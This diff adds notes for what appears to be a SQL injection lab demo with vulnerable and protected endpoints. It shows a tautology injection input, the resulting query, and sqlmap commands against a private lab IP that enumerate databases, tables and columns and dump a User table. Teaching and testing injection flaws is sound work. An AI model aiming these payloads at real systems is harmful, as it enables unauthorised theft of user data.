@@ -1,0 +1,15 @@
+
+Exploit:    http://localhost:8080/demosqli/
+Protected:  http://localhost:8080/demosqli/indexProtected.jsp
+
+Input => test’ or ‘1’=’1
+Query => SELECT * FROM User where userid='test' or '1' = '1' 
+
+SQLMAP Attacks:  (Run on Kali Linux to Remote IP)
+
+ sqlmap -u http://172.16.92.137:8080/demosqli/userCheck?user=test --dbs
+ sqlmap -u http://172.16.92.137:8080/demosqli/userCheck?user=test -D test --tables
+ sqlmap -u http://172.16.92.137:8080/demosqli/userCheck?user=test -D test -T User --columns
+ sqlmap -u http://172.16.92.137:8080/demosqli/userCheck?user=test -D test -T User --dump
+
+
